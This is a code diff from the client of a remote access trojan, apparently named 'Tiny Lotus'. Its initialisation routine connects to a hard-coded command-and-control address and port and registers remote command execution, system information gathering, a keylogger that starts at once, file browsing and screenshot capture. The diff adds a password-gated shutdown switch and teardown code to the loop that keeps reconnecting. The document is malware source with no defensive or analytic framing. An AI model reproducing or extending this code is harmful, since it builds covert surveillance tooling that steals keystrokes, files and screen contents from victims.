@@ -9,27 +9,23 @@
 ########################################################################################################################
 */
 
-Connection*		ConnObj;
-ObjMgr*			ObjList;
-RemoteCommand*	CmdObj;
-Info*			InfoObj;
-Keylogger*		KeyloggerObj;
-FileExplorer*	FileExplorerObj;
-Screenshot*		ScreenshotObj;
+Connection*		ConnObj				= NULL;
+ObjMgr*			ObjList				= NULL;
+RemoteCommand*	CmdObj				= NULL;
+Info*			InfoObj				= NULL;
+Keylogger*		KeyloggerObj		= NULL;
+FileExplorer*	FileExplorerObj		= NULL;
+Screenshot*		ScreenshotObj		= NULL;
+Switch*			SwitchObj			= NULL;
 
-struct config conf = {{0xCAFEBABE, 0xDEADBABE},L"TINYLOTUS 0.1","192.168.139.1", 6969, L"TINY_LOTUS@2sd4", true, "Tiny Lotus"};
+struct config conf = {{0xCAFEBABE, 0xDEADBABE},L"ALPHA TEST","192.168.139.1", "lazydog", 6969};
 
 bool Init()
 {
-	/*
-	if (OpenMutex(SYNCHRONIZE, FALSE, conf.mutex) == NULL)
-		CreateMutex(NULL, TRUE, conf.mutex);
-	else
-		return false;
-	*/
 
 	//Connection class
 	ConnObj = new Connection(conf.hostIP, conf.port);
+
 
 	//Create new obj list
 	ObjList = new ObjMgr();
@@ -39,13 +35,15 @@ bool Init()
 	ObjList->RegisterObj(CmdObj);
 	InfoObj = new Info(ConnObj, &conf);
 	ObjList->RegisterObj(InfoObj);
-	KeyloggerObj = new Keylogger(ConnObj, L"%Temp%\\Key.dat");
+	KeyloggerObj = new Keylogger(ConnObj);
 	ObjList->RegisterObj(KeyloggerObj);
 	KeyloggerObj->Start();
 	FileExplorerObj = new FileExplorer(ConnObj);
 	ObjList->RegisterObj(FileExplorerObj);
 	ScreenshotObj = new Screenshot(ConnObj);
 	ObjList->RegisterObj(ScreenshotObj);
+	SwitchObj = new Switch(ConnObj, conf.password);
+	ObjList->RegisterObj(SwitchObj);
 
 	return true;
 }
@@ -56,14 +54,14 @@ bool Update()
 {
 	while(1)
 	{
-		while (!ConnObj->IsConnected())
+		while (!ConnObj->IsConnected() && !SwitchObj->IsCloseSignature())
 			while(!ConnObj->Connect())
 				Sleep(2000);
 
 		//The skeleton
 		BYTE* packetData = (BYTE*)malloc(INIT_PACKET_BUFFER_SIZE);
 		size_t packetSize = INIT_PACKET_BUFFER_SIZE;
-		while (ConnObj->IsConnected())
+		while (ConnObj->IsConnected() && !SwitchObj->IsCloseSignature())
 		{
 			if (ConnObj->RecvRawPacket(packetData, &packetSize))
 			{
@@ -72,12 +70,28 @@ bool Update()
 			Sleep(100);
 		}
 		free(packetData);
+
+		if (!SwitchObj->IsCloseSignature())
+			break;
 	}
 	return true;
 }
 
 bool Finish()
 {
+	if (ConnObj->IsConnected())
+		ConnObj->CloseConnection();
+
+	ObjList->OnExit();
+	ObjList->ClearObjList(); //Clear but not free obj
+	delete SwitchObj;			SwitchObj		= NULL;
+	delete ScreenshotObj;		ScreenshotObj	= NULL;
+	delete FileExplorerObj;		FileExplorerObj = NULL;
+	delete KeyloggerObj;		KeyloggerObj	= NULL;
+	delete InfoObj;				InfoObj			= NULL;
+	delete CmdObj;				CmdObj			= NULL;
+	delete ObjList;				ObjList			= NULL;
+	delete ConnObj;				ConnObj			= NULL;
 	return true;
 }
 
